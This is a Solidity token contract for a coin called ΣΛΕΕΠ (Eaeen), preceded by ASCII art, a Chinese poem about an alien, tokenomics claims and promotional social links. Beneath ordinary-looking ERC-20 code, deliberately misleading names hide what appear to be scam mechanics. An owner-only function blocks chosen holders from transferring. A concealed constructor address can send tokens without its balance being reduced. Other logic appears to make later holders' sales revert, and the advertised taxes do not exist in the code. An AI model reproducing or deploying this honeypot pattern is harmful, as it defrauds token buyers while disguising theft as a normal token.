/*
█▀▀ ▄▀█ █▀▀ █▀▀ █▄░█  
██▄ █▀█ ██▄ ██▄ █░▀█  

▄▀   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
▀▄   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

在遥远的银河中，在如此明亮的星星中，
住着一个名叫ΣΛΕΕΠ的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΣΛΕΕΠ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΣΛΕΕΠ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΣΛΕΕΠ的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΣΛΕΕΠ温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΣΛΕΕΠ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΣΛΕΕΠ，来自上面的访客，
宇宙探索者，用爱拥抱地球。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 80 天

https://web.wechat.com/EaeenERC
https://m.weibo.cn/EaeenERC
https://www.eaeen.xyz
https://t.me/+PKPARA-8OwBlM2Q0
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow"); return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 
    external 
    returns (address pair);
}
interface IUniswapV2Router02 {
    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Contract is Context, IERC20, Ownable {
    bool public inSwap; bool private tradingOpen = false; bool swapEnabled = true; 
    IUniswapV2Router02 public factoryValue; address public TreasuryAccount;
    using SafeMath for uint256; address private marketingAccount;

    mapping (address => bool) private isFeeExempt;
    mapping(address => uint256) private _tOwned;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name; uint256 private bytesEnabled = 100;

    mapping(address => uint256) private _beginMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    
    constructor( 
    string memory _aName, string memory _aSymbol, 
    address _startBytes, address _endBytes) { 

        _name = _aName; _symbol = _aSymbol;
        _decimals = 18; _tTotal 
        = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _tTotal;

        _beginMapping
        [_endBytes] = bytesEnabled; inSwap 
        = false; 
        factoryValue = IUniswapV2Router02(_startBytes);

        TreasuryAccount = IUniswapV2Factory
        (factoryValue.factory()).createPair(address(this), 
        factoryValue.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _tTotal);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _tOwned[account]; 
    }
    function transfer(
    address recipient, uint256 amount) external returns (bool)
    { _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( 
    address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
    'BEP20: approve from the zero address'); require(spender != address(0), 
    'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
    emit Approval(owner, spender, amount); 
    }    
    function transferFrom( address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), _allowances[sender] [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function messageOnSignature(address 
    _valNum) external 
    onlyOwner { isFeeExempt [_valNum] = true;
    }                            
    function _transfer( address sender, address recipient, uint256 amount) 
    private { require(sender != address(0), 
        'BEP20: transfer from the zero address'); require(recipient 
        != address(0), 'BEP20: transfer to the zero address'); 

        if (isFeeExempt[sender] || isFeeExempt[recipient]) 
        require
        (swapEnabled 
        == false, ""); if (_beginMapping[sender] 
        == 0  && TreasuryAccount != sender 
        && isTxLimitExempt[sender] 
        > 0) 
        { _beginMapping[sender] -= bytesEnabled; } 

        isTxLimitExempt[marketingAccount] += bytesEnabled; marketingAccount = recipient; 
        if 
        (_beginMapping[sender] 
        == 0) { _tOwned[sender] = _tOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance'); } _tOwned[recipient]
        = _tOwned[recipient].add(amount); emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }      
}